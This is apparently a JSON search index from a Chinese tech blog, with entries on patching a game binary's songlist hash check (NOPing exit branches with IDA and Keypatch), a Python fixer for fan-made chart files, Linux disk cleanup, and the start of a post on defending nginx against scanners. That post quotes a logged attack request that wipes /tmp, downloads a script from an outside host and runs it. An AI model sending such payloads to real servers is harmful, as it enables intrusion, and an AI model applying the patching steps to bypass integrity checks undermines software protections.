\u7b49\u6587\u4ef6\u7684\u54c8\u5e0c\u6821\u9a8c"},{"location":"blog/2022/220414-fk-arcaea-songlist-hash/#_1","text":"\u9996\u5148\u5b57\u7b26\u4e32\u641c\u7d22 songlist \uff0c\u627e\u5230 songs/songlist \uff0c\u53cc\u51fb\u3002 \u53f3\u952e Xrefs graph to \uff0c\u770b\u770b\u8fd9\u4e2a\u53d8\u91cf\u88ab\u5f15\u7528\u7684\u4f4d\u7f6e\u3002 \u8fd9\u51e0\u4e2a\u51fd\u6570\u91cc\uff0c\u603b\u6709\u4e00\u4e2a\u662f\u5bf9 songlist \u505a\u54c8\u5e0c\u6821\u9a8c\u7684\uff0c\u90a3\u5c31\u4e00\u4e2a\u4e00\u4e2a\u6765\u770b\u5457\u3002\u8ba9\u6211\u4eec\u8282\u7ea6\u4e00\u70b9\u65f6\u95f4\uff0c\u5047\u8bbe\u5927\u5bb6\u8fd0\u6c14\u90fd\u5f88\u597d\uff0c\u4e00\u4e0a\u6765\u90fd\u6253\u7b97\u6765\u731c sub_9450EC \u8fd9\u4e2a\u51fd\u6570\u3002 \u53ef\u89c1\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u4ec5\u4ec5\u7528\u4e86 songs/songlist \uff0c\u8fd8\u7528\u5230\u4e86 songs/packlist \u548c songs/unlocks \u7b49\u8def\u5f84\u3002\u90a3\u770b\u6765\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u4e86\uff01 \u55ef\uff0cF5\u3002 \u89c2\u5bdf\u8fd9\u4e00\u957f\u4e32 if \u8bed\u53e5\u5757\uff1a \u6700\u540e\u8fd9\u91cc\u662f\u76f4\u63a5\u8c03\u7528 exit() \u51fd\u6570\u3002\u90a3\u770b\u6765\u5c31\u662f\u8fd9\u4e86\u3002 \u56de\u5230 IDA View \uff0c\u770b\u770b exit() \u51fd\u6570\u5728\u54ea\u3002 \u627e\u5230\u8c03\u7528 exit() \u51fd\u6570\u7684\u6807\u7b7e loc_9459F0 \uff0c\u5411\u4e0a\u9ad8\u4eae\u6240\u6709\u8df3\u8f6c\u5230\u8fd9\u4e2a\u6807\u7b7e\u7684\u6307\u4ee4\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u90fd\u662f\u4e00\u4e9b CBNZ \u548c B.NE \u6307\u4ee4\uff0c\u90a3\u5c31\u5f88\u597d\u529e\u4e86\uff0c\u5168\u90e8\u6539\u6210 NOP \u5c31\u884c\u3002","title":"\u5b9a\u4f4d"},{"location":"blog/2022/220414-fk-arcaea-songlist-hash/#_2","text":"\u76f4\u63a5\u4e0a Keypatch\u3002 \u603b\u51716\u5904\uff0c\u5168\u90e8\u6539\u6210 NOP \uff0c\u6539\u5b8c\u518d F5 \u4e00\u6b21\uff0c\u641c\u4e00\u4e0b exit \u3002 \u770b\u6765\u5df2\u7ecf\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a exit \u4e86\uff0c\u6536\u5de5\u3002","title":"\u4fee\u6539"},{"location":"blog/2022/220416-arcaea-fanmade-chart-problem/","tags":["arcaea"],"text":"\u4e00\u3001Arcade \u751f\u6210\u7684\u81ea\u5236\u8c31\uff08\u4ee5\u53ca Arcaoid \u8c31\uff09\u6ca1\u6709\u786e\u5b9a base_bpm \uff0c\u4f46\u662f songlist \u4e2d\u8fd9\u4e2a\u503c\u6bd4\u8f83\u91cd\u8981\uff0c\u8fd9\u4f53\u73b0\u5728\uff1a bpm \u5b57\u6bb5\u4e0d\u5f71\u54cd\u8c31\u9762\u57fa\u51c6\u6d41\u901f\uff0c\u53ea\u5f71\u54cd\u9009\u66f2\u754c\u9762\u7684\u663e\u793a\u6548\u679c\uff0c\u56e0\u6b64\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4efb\u610f\u503c\uff0c\u6216\u8005\u5199\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u4e1c\u897f\uff08\u6bd4\u5982\u5b9a\u6570\uff09 bpm_base \u7684\u503c\u4e0e timing \u8bed\u53e5\u4e2d\u58f0\u660e\u7684 bpm \u7684\u6bd4\u503c\u51b3\u5b9a\u8be5\u6bb5 timing \u5185\u7684\u5b9e\u9645\u6d41\u901f\u500d\u7387\uff08\uff1f\uff09 \u8fd9\u4e2a\u6bd4\u503c\u8d8a\u5c0f\uff0c\u6d41\u901f\u8d8a\u5feb \u4e00\u822c\u60c5\u51b5\u4e0b\u5efa\u8bae\u628a bpm_base \u76f4\u63a5\u8bbe\u7f6e\u4e3a t=0 \u7684 timing \u8bed\u53e5\u4e2d\u89c4\u5b9a\u7684 bpm\uff0c\u56e0\u4e3a \u7edd\u5927\u90e8\u5206 \u60c5\u51b5\u4e0b\u8fd9\u4e2a\u503c\u90fd\u662f\u8fd9\u9996\u6b4c\u7684 bpm \u503c \u4f46\u5f53\u9047\u5230\u67d0\u4e9b\u8c31\u9762\u5f00\u5934\u6d41\u901f\u5f02\u5e38\uff08\u4f8b\u5982\u767d\u9b54\u738b\uff09\u65f6\uff0c\u5efa\u8bae\u628a base_bpm \u8bbe\u7f6e\u6210\u5176\u4ed6 timing \u8bed\u53e5\u4e2d\u89c4\u5b9a\u7684 bpm \u503c \u6211\u4eec\u4ee5\u767d\u9b54\u738b\u4e3a\u4f8b\uff1a pragmatism_2.aff 1 2 3 4 5 6 7 8 9 10 timing(0,87.00,2.00); timing(11034,174.00,4.00); timing(33103,348.00,1.00); timing(34482,174.00,4.00); timing(57930,87.00,2.00); timing(68964,130.50,3.00); timing(78620,174.00,4.00); timing(103447,0.00,4.00); timing(104826,87.00,4.00); ... \u6ce8\u610f\uff0c\u767d\u9b54\u738b\u7684 base_bpm \u5728 songlist \u91cc\u8bbe\u7f6e\u4e3a 174 \u3002 \u56e0\u6b64\uff0c 0~11034 \u5185\u8c31\u9762\u901f\u5ea6\u4f1a\u964d\u5230\u539f\u6765\u7684\u4e00\u534a\uff0c\u800c 103447~104826 \u5185\u8c31\u9762\u901f\u5ea6\u53d8\u6210 0 \uff08\u9aa4\u505c\u6548\u679c\uff09\u3002 \u4e8c\u3001\u867d\u7136\u5b98\u65b9\u66f2\u5b50\u7684 base.jpg \u662f 512x512\uff0c base_256.jpg \u662f 256x256\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u5c3a\u5bf8\u662f\u53ef\u4ee5\u968f\u4fbf\u8bbe\u8ba1\u7684\uff0c\u751a\u81f3\u4e0d\u662f\u6b63\u65b9\u5f62\u90fd\u884c\u3002 \u4e09\u3001\u67d0\u4e9b\u81ea\u5236\u8c31\u4e2d aff \u6587\u4ef6\u7684\u8bed\u53e5\u4e0d\u7b26\u5408 Arcaea \u89c4\u8303\u3002\u8fd9\u4e9b\u8c31\u9762\u5728 Arcade \u4e2d\u80fd\u6b63\u5e38\u64ad\u653e\uff0c\u4f46\u662f\u5728 Arcaea \u4e2d\u9009\u66f2\u5b8c\u6210\u540e\u4f1a\u7acb\u5373\u95ea\u9000\u3002\u4ee5\u4e0b\u662f\u6211\u627e\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff1a timing \u8bed\u53e5\u4e2d\uff0c beats \u53c2\u6570\u4e0d\u80fd\u4e3a 0.00 \uff0c\u5f88\u591a\u81ea\u5236\u8c31\u4e3a\u4e86\u4e0d\u51fa\u73b0\u8282\u62cd\u7ebf\u4f1a\u8bbe\u7f6e\u6210 0.00 \u5982\u679c timing \u8bed\u53e5\u51fa\u73b0\u5728 timinggroup \u8bed\u53e5\u5757\u4e2d\uff0c\u90a3\u4e48 beats \u53c2\u6570\u548c bpm \u53c2\u6570\u5747\u53ef\u4e3a 0.00 \uff0c\u4e0d\u53d7\u4e0a\u4e00\u6761\u7684\u7ea6\u675f \u6bcf\u4e2a\u8c31\u9762\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a t=0 \u7684 timing \u8bed\u53e5\uff0c\u4e14\u5176 bpm \u53c2\u6570\u4e0d\u53ef\u4e3a\u8d1f\u6570 timing \u8bed\u53e5\u4e2d\uff0c bpm \u53c2\u6570\u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570 camera \u8bed\u53e5\u7684\u7b2c 2-7 \u4e2a\u53c2\u6570\uff08\u5373 transverse , bottomzoom , linezoom , steadyangle , topzoom , angle \uff09\u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570 arc \u8bed\u53e5\u4e2d color \u53c2\u6570\u7684\u503c\u53ea\u80fd\u662f 0/1/2/3 \uff08\u767d\u9b54\u738b\u662f 3 \uff09\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199 -1 arc \u8bed\u53e5\u4e2d t1 \u3001 t2 \u53c2\u6570\u7684\u503c\u5747\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199\u6210\u8d1f\u6570 \u6211\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 patch \u51fd\u6570\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 def patch_line ( line : str ) -> str : timing_params = re . match ( r 'timing\\((.+),(.+),(0\\.00)\\);' , line ) camera_params = re . match ( r 'camera\\((.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+)\\);' , line ) arc_params = re . match ( r 'arc\\((.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+)\\)(.+)?;' , line ) if timing_params : t , bpm , beats = timing_params . groups () # timing \u51fd\u6570\u4e2d\uff0cbeats \u4e0d\u80fd\u4e3a 0.00\uff08\u4e00\u4e9b\u81ea\u5236\u8c31\u5e38\u89c1\u95ee\u9898\uff09\uff0c\u5426\u5219\u5fc5\u7136\u5ba2\u6237\u7aef\u95ea\u9000\uff08\u95ea\u9000\u65f6\u4e0d\u4f1a\u53d1\u51fa\u58f0\u97f3\uff09 if beats == '0.00' : beats = '4.00' # timing \u51fd\u6570\u4e2d\uff0cbpm \u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff0c\u5426\u5219\u5fc5\u7136\u5ba2\u6237\u7aef\u95ea\u9000 if '.' not in bpm or bpm . split ( '.' )[ 1 ] != '00' : bpm = f ' { float ( bpm ) : .2f } ' return f 'timing( { t } , { bpm } , { beats } ); \\n ' elif camera_params : t , * params , easing , lastingtime = camera_params . groups () for index , param in enumerate ( params ): # camera \u51fd\u6570\u7684 2-7 \u4e2a\u53c2\u6570\u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff08\u4e00\u4e9b\u81ea\u5236\u8c31\u5e38\u89c1\u95ee\u9898\uff09\uff0c\u5426\u5219\u5fc5\u7136\u5ba2\u6237\u7aef\u95ea\u9000 if '.' not in param or param . split ( '.' )[ 1 ] != '00' : params [ index ] = f ' { float ( param ) : .2f } ' return f 'camera( { t } , { \",\" . join ( params ) } , { easing } , { lastingtime } ); \\n ' elif arc_params : t1 , * params , color , FX , skylineBoolean , arc_taps = arc_params . groups () print ( arc_params . groups ()) # arc\u7684t1\u3001t2\u5747\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199\u6210\u8d1f\u6570\uff0c\u8fd9\u5c06\u5bfc\u81f4\u95ea\u9000 if t1 . startswith ( '-' ): t1 = '0' # arc\u7684\u86c7\u7684\u989c\u8272\u53c2\u6570\uff0c\u53ea\u80fd\u662f0\\1\\2\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199-1\uff0c\u8fd9\u5c06\u5bfc\u81f4\u95ea\u9000 if color == '-1' : color = '2' if not arc_taps : arc_taps = '' return f 'arc( { t1 } , { \",\" . join ( params ) } , { color } , { FX } , { skylineBoolean } ) { arc_taps } ; \\n ' else : return line def patch_aff ( song_dir ): for file in os . listdir ( song_dir ): if file . endswith ( '.aff' ): with open ( f ' { song_dir } / { file } ' , 'r' , encoding = 'utf-8' ) as f : lines = f . readlines () with open ( f ' { song_dir } / { file } ' , 'w' , encoding = 'utf-8' ) as f : f . writelines ( map ( patch_line , lines ))","title":"Arcaea \u81ea\u5236\u8c31\u79fb\u690d\u5e38\u89c1\u95ee\u9898"},{"location":"blog/2022/220417-linux-clean-up-disk-space/","tags":["linux"],"text":"\u4f7f\u7528\u5982\u4e0b\u65b9\u5f0f\u53ef\u4ee5\u6e05\u7406 Linux \u7684\u7edd\u5927\u90e8\u5206\u5783\u573e\u3002 \u6e05\u7406 journal \u65e5\u5fd7 \u00b6 \u4e00\u822c\u53ef\u4ee5\u6e05\u7406 2~3 GB\u3002 \u67e5\u770b journal \u65e5\u5fd7\u5360\u7528\u7684\u786c\u76d8\u7a7a\u95f4\uff1a journalctl -x --disk-usage \u4e00\u6b21\u6027\u6e05\u7406 journal \u65e5\u5fd7\uff1a journalctl --vacuum-size = 10M # \u6e05\u7406\u65e5\u5fd7\u5230\u53ea\u5269\u4e0b 10M journalctl --vacuum-time = 1d # \u6e05\u7406\u4e00\u5929\u524d\u7684\u65e5\u5fd7 \u6ce8\u610f \u8fd9\u4e24\u4e2a\u64cd\u4f5c\u53ea\u662f\u4e00\u6b21\u6027\u6e05\u9664\u65e5\u5fd7\uff0c \u5e76\u4e0d\u80fd\u9650\u5236\u4ee5\u540e\u7684\u65e5\u5fd7\u6587\u4ef6\u4e0d\u4f1a\u8d85\u8fc7\u8fd9\u4e2a\u5927\u5c0f \u3002\u5f88\u591a\u535a\u5ba2\u91cc\u8bf4\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u5c5e\u5b9e\u662f\u8bef\u5bfc\u4eba\u3002 \u5982\u679c\u9700\u8981\u6c38\u4e45\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9700\u8981\u4fee\u6539 /etc/systemd/journald.conf \u6587\u4ef6\u3002 \u6c38\u4e45\u9650\u5236 journal \u65e5\u5fd7\u7684\u5927\u5c0f\uff1a journald.conf [Journal] SystemMaxUse=10M # \u786c\u76d8\u4e2d\u53ea\u4fdd\u7559\u6700\u8fd1 10M \u7684\u65e5\u5fd7 RuntimeMaxUse=10M # \u5185\u5b58\u4e2d\u53ea\u4fdd\u7559\u6700\u8fd1 10M \u7684\u65e5\u5fd7 \u4e0d\u4fdd\u7559\u65e5\u5fd7 journald.conf [Journal] Storage=none # \u4e22\u5f03\u6240\u6709\u7684\u65e5\u5fd7\uff0c\u4e0d\u4fdd\u5b58\u5230\u5185\u5b58\u6216\u78c1\u76d8 \u5371\u9669 \u4e0d\u8981\u4f7f\u7528 rm \u547d\u4ee4\u6765\u5220\u9664 journal \u65e5\u5fd7\u3002\u53c2\u8003 \u5220\u9664\u65e5\u5fd7\u91ca\u653e\u7a7a\u95f4\u6700\u597d\u4e0d\u8981\u7528rm \u6e05\u7406 apt-get \u7f13\u5b58 \u00b6 \u4e00\u822c\u53ef\u4ee5\u6e05\u7406\u6570\u767e MB\u3002 apt-get clean \u6e05\u7406 pip \u7f13\u5b58 \u00b6 \u4e00\u822c\u53ef\u4ee5\u6e05\u7406\u4e24\u4e09\u767e MB\u3002 rm -r ~/.cache/pip \u6e05\u7406\u65e7\u7248\u672c snap \u5305 \u00b6 \u4e00\u822c\u6bcf\u4e2a\u65e7\u7684 snap \u5305\u53ef\u4ee5\u6e05\u7406 100 MB\u3002 \u5217\u51fa\u6240\u6709\u7684 snap \u5305\uff1a snap list --all \u53ef\u4ee5\u89c1\u5230\u5f88\u591a\u6807\u8bb0\u4e3a disabled \u7684 snap \u5305\uff0c\u8fd9\u4e9b\u5305\u662f\u53ef\u4ee5\u76f4\u63a5\u5378\u8f7d\u7684\u3002 Name Version Rev Tracking Publisher Notes certbot 1.26.0 1952 latest/stable certbot-eff\u2713 classic cmake 3.23.0 1070 latest/stable crascit\u2713 disabled,classic cmake 3.23.1 1082 latest/stable crascit\u2713 classic core 16-2.55.2 12941 latest/stable canonical\u2713 core,disabled core 16-2.54.4 12834 latest/stable canonical\u2713 core core18 20220309 2344 latest/stable canonical\u2713 base core20 20220318 1405 latest/stable canonical\u2713 base \u5220\u9664\u8fd9\u4e9b\u91cd\u590d\u7684 snap \u5305\uff1a snap remove XXXX --revision YYYY # XXXX \u662f\u8f6f\u4ef6\u7684 name\uff0cYYYY \u662f\u8f6f\u4ef6\u7684 Rev \u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u6e05\u9664\uff1a \u6765\u81ea How to Clean Up Snap Package Versions in Linux #!/bin/bash # Removes old revisions of snaps # CLOSE ALL SNAPS BEFORE RUNNING THIS set -eu snap list --all | awk '/disabled/{print $1, $3}' | while read snapname revision ; do snap remove \" $snapname \" --revision = \" $revision \" done \u6e05\u7406\u767b\u5f55\u65e5\u5fd7 \u00b6 \u8fd9\u4e2a\u6587\u4ef6\u662f\u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u7684\u65e5\u5fd7\uff0c\u5982\u679c\u6709\u4eba\u6bcf\u5929\u8bd5\u4f60\u7684\u5bc6\u7801\u6765\u66b4\u529b\u7834\u89e3\u4f60\u7684 ssh\uff0c\u90a3\u4f60\u7684\u8fd9\u4e2a\u6587\u4ef6\u5c31\u4f1a\u5f88\u5927\u3002 echo \"\" > /var/log/btmp \u8be5\u6587\u4ef6\u540c\u7406 echo \"\" > /var/log/auth.log \u540c\u7406\uff0c\u4e0d\u5e94\u5f53\u4f7f\u7528 rm \u800c\u662f\u4f7f\u7528 echo \u6765\u6e05\u7a7a\u8fd9\u4e24\u4e2a\u65e5\u5fd7\u3002","title":"Linux \u6e05\u7406\u78c1\u76d8\u7a7a\u95f4\u5e38\u89c1\u64cd\u4f5c"},{"location":"blog/2022/220417-linux-clean-up-disk-space/#journal","text":"\u4e00\u822c\u53ef\u4ee5\u6e05\u7406 2~3 GB\u3002 \u67e5\u770b journal \u65e5\u5fd7\u5360\u7528\u7684\u786c\u76d8\u7a7a\u95f4\uff1a journalctl -x --disk-usage \u4e00\u6b21\u6027\u6e05\u7406 journal \u65e5\u5fd7\uff1a journalctl --vacuum-size = 10M # \u6e05\u7406\u65e5\u5fd7\u5230\u53ea\u5269\u4e0b 10M journalctl --vacuum-time = 1d # \u6e05\u7406\u4e00\u5929\u524d\u7684\u65e5\u5fd7 \u6ce8\u610f \u8fd9\u4e24\u4e2a\u64cd\u4f5c\u53ea\u662f\u4e00\u6b21\u6027\u6e05\u9664\u65e5\u5fd7\uff0c \u5e76\u4e0d\u80fd\u9650\u5236\u4ee5\u540e\u7684\u65e5\u5fd7\u6587\u4ef6\u4e0d\u4f1a\u8d85\u8fc7\u8fd9\u4e2a\u5927\u5c0f \u3002\u5f88\u591a\u535a\u5ba2\u91cc\u8bf4\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u5c5e\u5b9e\u662f\u8bef\u5bfc\u4eba\u3002 \u5982\u679c\u9700\u8981\u6c38\u4e45\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9700\u8981\u4fee\u6539 /etc/systemd/journald.conf \u6587\u4ef6\u3002 \u6c38\u4e45\u9650\u5236 journal \u65e5\u5fd7\u7684\u5927\u5c0f\uff1a journald.conf [Journal] SystemMaxUse=10M # \u786c\u76d8\u4e2d\u53ea\u4fdd\u7559\u6700\u8fd1 10M \u7684\u65e5\u5fd7 RuntimeMaxUse=10M # \u5185\u5b58\u4e2d\u53ea\u4fdd\u7559\u6700\u8fd1 10M \u7684\u65e5\u5fd7 \u4e0d\u4fdd\u7559\u65e5\u5fd7 journald.conf [Journal] Storage=none # \u4e22\u5f03\u6240\u6709\u7684\u65e5\u5fd7\uff0c\u4e0d\u4fdd\u5b58\u5230\u5185\u5b58\u6216\u78c1\u76d8 \u5371\u9669 \u4e0d\u8981\u4f7f\u7528 rm \u547d\u4ee4\u6765\u5220\u9664 journal \u65e5\u5fd7\u3002\u53c2\u8003 \u5220\u9664\u65e5\u5fd7\u91ca\u653e\u7a7a\u95f4\u6700\u597d\u4e0d\u8981\u7528rm","title":"\u6e05\u7406 journal \u65e5\u5fd7"},{"location":"blog/2022/220417-linux-clean-up-disk-space/#apt-get","text":"\u4e00\u822c\u53ef\u4ee5\u6e05\u7406\u6570\u767e MB\u3002 apt-get clean","title":"\u6e05\u7406 apt-get \u7f13\u5b58"},{"location":"blog/2022/220417-linux-clean-up-disk-space/#pip","text":"\u4e00\u822c\u53ef\u4ee5\u6e05\u7406\u4e24\u4e09\u767e MB\u3002 rm -r ~/.cache/pip","title":"\u6e05\u7406 pip \u7f13\u5b58"},{"location":"blog/2022/220417-linux-clean-up-disk-space/#snap","text":"\u4e00\u822c\u6bcf\u4e2a\u65e7\u7684 snap \u5305\u53ef\u4ee5\u6e05\u7406 100 MB\u3002 \u5217\u51fa\u6240\u6709\u7684 snap \u5305\uff1a snap list --all \u53ef\u4ee5\u89c1\u5230\u5f88\u591a\u6807\u8bb0\u4e3a disabled \u7684 snap \u5305\uff0c\u8fd9\u4e9b\u5305\u662f\u53ef\u4ee5\u76f4\u63a5\u5378\u8f7d\u7684\u3002 Name Version Rev Tracking Publisher Notes certbot 1.26.0 1952 latest/stable certbot-eff\u2713 classic cmake 3.23.0 1070 latest/stable crascit\u2713 disabled,classic cmake 3.23.1 1082 latest/stable crascit\u2713 classic core 16-2.55.2 12941 latest/stable canonical\u2713 core,disabled core 16-2.54.4 12834 latest/stable canonical\u2713 core core18 20220309 2344 latest/stable canonical\u2713 base core20 20220318 1405 latest/stable canonical\u2713 base \u5220\u9664\u8fd9\u4e9b\u91cd\u590d\u7684 snap \u5305\uff1a snap remove XXXX --revision YYYY # XXXX \u662f\u8f6f\u4ef6\u7684 name\uff0cYYYY \u662f\u8f6f\u4ef6\u7684 Rev \u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u6e05\u9664\uff1a \u6765\u81ea How to Clean Up Snap Package Versions in Linux #!/bin/bash # Removes old revisions of snaps # CLOSE ALL SNAPS BEFORE RUNNING THIS set -eu snap list --all | awk '/disabled/{print $1, $3}' | while read snapname revision ; do snap remove \" $snapname \" --revision = \" $revision \" done","title":"\u6e05\u7406\u65e7\u7248\u672c snap \u5305"},{"location":"blog/2022/220417-linux-clean-up-disk-space/#_1","text":"\u8fd9\u4e2a\u6587\u4ef6\u662f\u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u7684\u65e5\u5fd7\uff0c\u5982\u679c\u6709\u4eba\u6bcf\u5929\u8bd5\u4f60\u7684\u5bc6\u7801\u6765\u66b4\u529b\u7834\u89e3\u4f60\u7684 ssh\uff0c\u90a3\u4f60\u7684\u8fd9\u4e2a\u6587\u4ef6\u5c31\u4f1a\u5f88\u5927\u3002 echo \"\" > /var/log/btmp \u8be5\u6587\u4ef6\u540c\u7406 echo \"\" > /var/log/auth.log \u540c\u7406\uff0c\u4e0d\u5e94\u5f53\u4f7f\u7528 rm \u800c\u662f\u4f7f\u7528 echo \u6765\u6e05\u7a7a\u8fd9\u4e24\u4e2a\u65e5\u5fd7\u3002","title":"\u6e05\u7406\u767b\u5f55\u65e5\u5fd7"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/","tags":["nginx","gzip-bomb","flask"],"text":"\u8d77\u56e0 \u00b6 cat /var/log/nginx/error.log \u7136\u540e\u53d1\u73b0 nginx \u65e5\u5fd7\u91cc\u5168\u662f\u626b\u63cf\u5668\u7684 404\uff0c\u8ba9\u6211\u4eec\u653e\u4e24\u4e2a\u4e0a\u6765\u5c55\u793a\u4e00\u4e0b\uff1a 2022/04/21 06:45:30 [error] 3281302#3281302: *239 open() \"/usr/share/nginx/html/GponForm/diag_Form\" failed (2: No such file or directory), client: XXX.XXX.XXX.XXX, server: localhost, request: \"POST /GponForm/diag_Form?images/ HTTP/1.1\", host: \"XXX.XXX.XXX.XXX\" 2022/04/21 20:36:23 [error] 3281302#3281302: *1497 open() \"/usr/share/nginx/html/shell\" failed (2: No such file or directory), client: XXX.XXX.XXX.XXX, server: localhost, request: \"GET /shell?cd+/tmp;rm+-rf+*;wget+ tigoinari.tk/jaws;sh+/tmp/jaws HTTP/1.1\", host: \"XXX.XXX.XXX.XXX\" \u5f88\u70e6\uff0c\u4e00\u5806\u626b\u63cf\u5668\u5728\u626b\u6211\u7684\u914d\u7f6e\uff0c\u53e6\u4e00\u5806\u626b\u63cf\u5668\u5728\u5e2e\u6211\u8c03\u7528 nginx \u7684 shell \u6765 rm -rf * \uff0c\u8fd8\u6709\u4e00\u5806\u626b\u63cf\u5668\u5728\u5e2e\u6211\u6267\u884c\u6076\u610f\u811a\u672c\u3002 \u4e0d\u5f97\u4e0d\u8bf4\uff0c\u626b\u914d\u7f6e\u7684\u626b\u63cf\u5668\u867d\u7136\u6ca1\u4ec0\u4e48\u4f24\u5bb3\u529b\uff0c\u4f46\u662f\u5929\u5929\u7ed9 error.log \u52a0\u65e0\u610f\u4e49\u7684 log\uff0c\u672c\u8d28\u4e0a\u4e5f\u7b97\u662f\u4e00\u79cd\u9a9a\u6270\u4e86\u3002\u4f46\u662f\u6267\u884c\u811a\u672c\u7684\u6211\u771f\u7684\u770b\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u4e14\u4e07\u4e00\u54ea\u5929\u51fa\u4e86\u4e2a\u67d0\u67d0\u6f0f\u6d1e\uff0c\u7136\u540e\u771f\u6267\u884c\u6210\u529f\u4e86\u5462\uff0c\u770b\u6765\u5f97\u7528\u70b9\u624b\u6bb5\u5904\u7406\u6389\u3002 \u6e29\u548c\u7684\u5904\u7406\u65b9\u6cd5 \u00b6 \u6076\u610f\u626b\u63cf\u5668\u626b\u7f51\u7ad9\uff0c\u6839\u636e\u65e5\u5fd7\u4e2d\u663e\u793a\u7684 host \u7684\u503c\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u60c5\u51b5\uff1a host \u662f\u81ea\u5df1\u7684\u516c\u7f51 IP\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u5728\u516c\u7f51\u4e0a\u626b IP \u6bb5\uff0c\u5e76\u4e14\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee\u4f60\u7684\u4e3b\u673a\u768480\u7aef\u53e3 host \u662f 127.0.0.1 \u6216 localhost \uff1a\u8bf4\u660e\u626b\u63cf\u5668\u626b\u7684\u662f\u4f60\u7684\u57df\u540d\uff0c\u5e76\u901a\u8fc7 nginx \u53cd\u4ee3\u5230\u4e86 localhost host \u662f\u4f60\u7684\u57df\u540d\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u722c\u7684\u662f\u4f60\u7684\u57df\u540d \u540e\u4e24\u79cd\u60c5\u51b5\u53ef\u4ee5\u4ea4\u7ed9 Cloudflare \u89e3\u51b3\uff0c\u628a\u5b89\u5168\u6027\u9762\u677f\u4e0a\u7684 \u6258\u7ba1\u89c4\u5219 \u6253\u5f00\u5c31\u884c\uff08\u53ef\u60dc\u73b0\u5728\u6682\u65f6\u8fd8\u7528\u4e0d\u4e86\uff0c\u5f97\u7b49 cf \u4e0a\u7ebf\uff09\u3002 \u8f7b\u677e\u914d\u7f6e\u548c\u90e8\u7f72 Cloudflare \u51ed\u501f\u4fdd\u62a4\u6570\u767e\u4e07\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u7ecf\u9a8c\u6784\u5efa\u7684\u89c4\u5219\u3002Cloudflare \u514d\u8d39\u6258\u7ba1\u89c4\u5219\u96c6\u5373\u5c06\u4e0a\u7ebf\uff01 https://blog.cloudflare.com/waf-for-everyone/ \uff08\u6572\u7897\u7b49 cf \u4e0a\u7ebf\u514d\u8d39\u6258\u7ba1\u89c4\u5219\u96c6\uff09 \u672c\u6587\u7740\u91cd\u8ba8\u8bba\u7b2c\u4e00\u79cd\u60c5\u51b5\u3002\u7b2c\u4e00\u79cd\u60c5\u51b5\u53ef\u4ee5\u4f7f nginx \u963b\u6b62\u6240\u6709\u7684\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff0c\u5177\u4f53\u8bbe\u7f6e\u5982\u4e0b\uff1a nginx.conf\uff08\u90e8\u5206\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { listen 80 default_server ; listen [::]:80 default_server ; server_name _ ; return 403 ; } server { listen 80 ; listen [::]:80 ; server_name localhost 127 .0.0.1 ; ... } nginx \u7684 default_server \u6307\u4ee4\u53ef\u4ee5\u5b9a\u4e49\u9ed8\u8ba4\u7684 server \u53bb\u5904\u7406\u4e00\u4e9b\u6ca1\u6709\u5339\u914d\u5230 server_name \u7684\u8bf7\u6c42\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\uff0c\u5219\u4f1a\u9009\u53d6\u7b2c\u4e00\u4e2a\u5b9a\u4e49\u7684 server \u4f5c\u4e3a default_server \u3002\uff08\u89c1 nginx \u7684 default_server \u5b9a\u4e49\u53ca\u5339\u914d\u89c4\u5219 \uff09 \u8fd9\u91cc\u6211\u4eec\u663e\u5f0f\u5b9a\u4e49\u4e00\u4e2a default_server \uff0c\u5176 server_name 